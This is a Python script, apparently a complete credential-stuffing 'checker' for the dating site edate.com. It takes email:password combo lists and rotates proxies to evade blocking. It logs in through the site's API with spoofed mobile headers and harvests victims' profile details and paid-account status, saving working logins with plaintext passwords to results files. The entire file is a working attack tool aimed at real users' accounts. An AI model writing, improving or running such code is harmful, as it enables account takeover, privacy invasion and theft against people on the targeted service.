import requests
import time
import sys
import json
import os # New import for file system operations
from typing import Optional, Dict, Tuple, List
import threading
from queue import Queue

class EDateChecker:
    """
    A class to handle EDate account checking with a dedicated thread for
    dynamic console output and multithreading.
    """
    
    def __init__(self):
        # Using a lock to ensure thread-safe updates to shared variables.
        self.lock = threading.Lock()
        self.total_checked = 0
        self.hits = 0
        self.bad = 0
        self.start_time = time.time()
        self.total_credentials = 0
        self.stop_event = threading.Event()
    
    def parse_proxy_line(self, line: str) -> Optional[str]:
        """Parses a proxy string into a valid format for requests."""
        line = line.strip()
        if not line:
            return None
            
        if "://" in line:
            return line
            
        parts = line.split(':')
        if len(parts) == 2:
            return f"http://{line}"
        elif len(parts) == 4:
            ip, port, user, passwd = parts
            return f"http://{user}:{passwd}@{ip}:{port}"
        else:
            return None

    def test_proxy(self, proxy: str) -> bool:
        """Tests if a proxy is functional by making a request to httpbin.org."""
        try:
            test_url = "http://httpbin.org/ip"
            response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=10)
            return response.status_code == 200
        except Exception:
            return False

    def edate_login(self, user: str, password: str, proxy: Optional[str] = None) -> Tuple[Optional[requests.Session], Optional[str]]:
        """
        Attempts to log in to edate.com and returns a session object
        and an error message if the login fails.
        """
        current_time = int(time.time() * 1000)
        login_url = f"https://www.edate.com/api/user/auth/m/login?_dc={current_time}"

        login_headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "E-AL": "",
            "E-D": "Linux i686",
            "E-ID": "",
            "E-OS": "",
            "E-P": "4",
            "E-S": "3",
            "E-V": "3",
            "Host": "www.edate.com",
            "Origin": "https://app.edate.com",
            "Referer": "https://app.edate.com/",
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-N975F Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.135 Mobile Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }

        login_data = {
            "user": user,
            "pass": password,
            "reactivate": "0",
            "autoLogin": "1"
        }

        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}

        # Create a new session for each login attempt to avoid cookie conflicts
        session = requests.Session()
        
        try:
            response = session.post(login_url, headers=login_headers, data=login_data, 
                                    proxies=proxies, timeout=15)
        except requests.exceptions.ProxyError as e:
            return None, f"Proxy Error: {e}"
        except requests.exceptions.ConnectTimeout as e:
            return None, f"Connection Timeout: {e}"
        except requests.exceptions.ConnectionError as e:
            return None, f"Connection Error: {e}"
        except Exception as e:
            return None, f"Unexpected Error: {e}"

        if response.status_code != 200:
            return None, f"HTTP Status: {response.status_code}"

        try:
            login_json = response.json()
        except json.JSONDecodeError as e:
            return None, f"JSON decode error: {e}"

        if login_json.get("status") != "ok":
            err = login_json.get("errorMessage", "Unknown error")
            return None, err

        cookies = login_json.get("cookies", {})
        for key, value in cookies.items():
            session.cookies.set(key, value)

        return session, None

    def get_paying_member_status(self, session: requests.Session) -> Optional[str]:
        """Extracts the paying member status from the session cookies."""
        play_session = session.cookies.get('PLAY_SESSION')
        if not play_session:
            return None

        parts = play_session.split('&')
        for part in parts:
            if part.startswith("PAYING_MEMBER="):
                value = part.split('=', 1)[1].lower()
                if value in ['1', 'paying', 'full']:
                    return "Paid"
                elif value in ['0', 'guest', 'reactivator']:
                    return "UnPaid"
                else:
                    return value
        return None

    def get_profile(self, session: requests.Session) -> Optional[Dict]:
        """Fetches profile information for the logged-in user."""
        current_time = int(time.time() * 1000)
        profile_url = f"https://www.edate.com/api/user/profile?_dc={current_time}&view=info&page=1&start=0&limit=25"

        profile_headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Host": "www.edate.com",
            "Origin": "https://app.edate.com",
            "Referer": "https://app.edate.com/",
            "sec-ch-ua": '"Chromium";v="134", "Not:A-Brand";v="24", "Android WebView";v="134"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-N975F Build/PI; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/134.0.6998.135 Mobile Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        }

        try:
            response = session.get(profile_url, headers=profile_headers, timeout=20)
        except Exception:
            return None

        if response.status_code != 200:
            return None

        try:
            profile_json = response.json()
        except:
            return None

        def recursive_search(d, key):
            if isinstance(d, dict):
                if key in d:
                    return d[key]
                for v in d.values():
                    result = recursive_search(v, key)
                    if result is not None:
                        return result
            elif isinstance(d, list):
                for item in d:
                    result = recursive_search(item, key)
                    if result is not None:
                        return result
            return None

        profile_data = {}
        profile_data['Gender'] = recursive_search(profile_json, "Gender")
        profile_data['Age'] = recursive_search(profile_json, "Age")
        profile_data['SignupDate'] = recursive_search(profile_json, "SignupDate")
        profile_data['City'] = recursive_search(profile_json, "City")
        profile_data['HasImages'] = recursive_search(profile_json, "HasImages")
        country_dict = recursive_search(profile_json, "Country")
        if isinstance(country_dict, dict):
            profile_data['Country'] = country_dict.get("value")
        else:
            profile_data['Country'] = None

        return profile_data
        
    def worker(self, queue: Queue, proxies: List[str]):
        """Worker function for threads to process credentials from the queue."""
        while True:
            try:
                cred_index, cred = queue.get(timeout=1)
            except:
                break # Exit the loop if the queue is empty

            user, password = cred.split(':', 1)
            
            proxy = None
            if proxies:
                proxy = proxies[cred_index % len(proxies)]
            
            session, error = self.edate_login(user, password, proxy)
            
            with self.lock:
                self.total_checked += 1
                if session and not error:
                    profile_data = self.get_profile(session)
                    paying_status = self.get_paying_member_status(session)
                    if paying_status is None:
                        paying_status = "Unknown"

                    self.hits += 1
                    line_to_write = f"eDate({paying_status}) | {profile_data.get('Country', 'N/A')} | Gender: {profile_data.get('Gender', 'N/A')}, Age: {profile_data.get('Age', 'N/A')}, SignupDate: {profile_data.get('SignupDate', 'N/A')}, City: {profile_data.get('City', 'N/A')} | edate.com | {user} | {password}\n"
                    
                    try:
                        if paying_status.lower() == "paid":
                            with open("RESULTS/paid.txt", "a", encoding="utf-8") as paid_file:
                                paid_file.write(line_to_write)
                        else:
                            with open("RESULTS/unpaid.txt", "a", encoding="utf-8") as unpaid_file:
                                unpaid_file.write(line_to_write)
                    except Exception as e:
                        print(f"Gabim gjate shkrimit te file: {e}", file=sys.stderr)
                else:
                    self.bad += 1
                    try:
                        with open("RESULTS/remaining.txt", "a", encoding="utf-8") as remaining_file:
                            remaining_file.write(cred + "\n")
                    except Exception as e:
                        print(f"Gabim gjate shkrimit te file: {e}", file=sys.stderr)
            
            queue.task_done()

    def stats_printer(self):
        """Dedicated thread function to print statistics."""
        while not self.stop_event.is_set():
            with self.lock:
                elapsed = time.time() - self.start_time
                cpm = int((self.total_checked / (elapsed if elapsed > 0 else 1)) * 60)
                
                # Using ANSI escape codes for coloring terminal output
                green = "\033[92m"
                red = "\033[91m"
                yellow = "\033[93m"
                blue = "\033[94m"
                reset = "\033[0m"

                # Calculate progress and format the progress bar
                progress = self.total_checked / self.total_credentials if self.total_credentials > 0 else 0
                bar_length = 20
                filled_bar = "█" * int(progress * bar_length)
                empty_bar = " " * (bar_length - len(filled_bar))
                
                # Format the statistics line
                line = (
                    f"{yellow}Progres{reset}: [{filled_bar}{empty_bar}] "
                    f"{progress:.1%} | "
                    f"Checked: {blue}{self.total_checked}/{self.total_credentials}{reset} | "
                    f"Hits: {green}{self.hits}{reset} | "
                    f"Bad: {red}{self.bad}{reset} | "
                    f"CPM: {cpm}   "
                )
                
                sys.stdout.write(f"\r{line.ljust(80)}")
                sys.stdout.flush()

            time.sleep(0.5) # Update every half second

    def process_credentials(self, credentials: List[str], proxies: List[str] = None, num_threads: int = 10):
        """Uses multithreading to process credentials."""
        self.total_credentials = len(credentials)

        # Create the results directory if it doesn't exist
        os.makedirs('RESULTS', exist_ok=True)
        
        print("\nFillimi i procesimit...")
        print("=" * 60)
        
        # Create a queue and populate it with credentials and their original index
        queue = Queue()
        for i, cred in enumerate(credentials):
            if ':' in cred:
                queue.put((i, cred))
            else:
                with self.lock:
                    self.bad += 1
        
        # Start the dedicated stats printer thread
        stats_thread = threading.Thread(target=self.stats_printer)
        stats_thread.daemon = True
        stats_thread.start()

        # Create and start the worker threads
        num_threads_to_use = min(num_threads, queue.qsize() or 1)
        
        threads = []
        for _ in range(num_threads_to_use):
            t = threading.Thread(target=self.worker, args=(queue, proxies))
            t.daemon = True # Allows the program to exit even if threads are still running
            t.start()
            threads.append(t)
        
        # Wait for all credentials in the queue to be processed
        queue.join()
        
        # Signal the stats printer thread to stop
        self.stop_event.set()
        
        # Print final statistics
        print("\n" + "=" * 60)
        print(f"Procesi perfundoi! Rezultatet: Total: {self.total_credentials}, Hits: {self.hits}, Bad: {self.bad}")

def print_banner():
    """Prints a banner for the application."""
    banner = """
====================================
      eDate Checker by Gemini
      Proxy supported + CPM/Hits/Bad
====================================
"""
    print(banner)

def main():
    """Main function to run the EDate checker application."""
    print_banner()

    filename = input("Shkruani emrin e file me kredenciale (email:pass format): ").strip()
    proxyfile = input("Shkruani emrin e file me proxyt (ose shtypni Enter per te mos perdorur proxy): ").strip()
    
    num_threads = 0
    while True:
        try:
            num_threads_input = input("Zgjedh numrin e threads (1-100): ").strip()
            num_threads = int(num_threads_input)
            if 1 <= num_threads <= 100:
                break
            else:
                print("Ju lutemi zgjidhni një numër midis 1 dhe 100.")
        except ValueError:
            print("Gabim: Ju lutemi shkruani një numër të plotë.")


    try:
        with open(filename, "r", encoding="utf-8") as f:
            credentials = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Gabim në leximin e file me kredenciale: {e}", file=sys.stderr)
        sys.exit(1)

    proxies = []
    if proxyfile:
        try:
            with open(proxyfile, "r", encoding="utf-8") as f:
                proxy_lines = [line.strip() for line in f if line.strip()]
                
            checker = EDateChecker()
            print("Testimi i proxy-ve...")
            working_proxies = []
            
            for i, pline in enumerate(proxy_lines):
                proxy_parsed = checker.parse_proxy_line(pline)
                if proxy_parsed and checker.test_proxy(proxy_parsed):
                    working_proxies.append(proxy_parsed)
                print(f"\rTestuar {i+1}/{len(proxy_lines)} proxy, të suksesshëm: {len(working_proxies)}", end='', flush=True)
            
            proxies = working_proxies
            print(f"\rGjetëm {len(proxies)} proxy të funksionueshëm nga {len(proxy_lines)}", end='', flush=True)
            print() # Print a newline after proxy testing is done
            
        except Exception as e:
            print(f"Gabim në leximin e file me proxyt: {e}", file=sys.stderr)
            sys.exit(1)
    
    checker = EDateChecker()
    checker.process_credentials(credentials, proxies, num_threads=num_threads)
    
    print("\nProcesi perfundoi!")

if __name__ == "__main__":
    main()
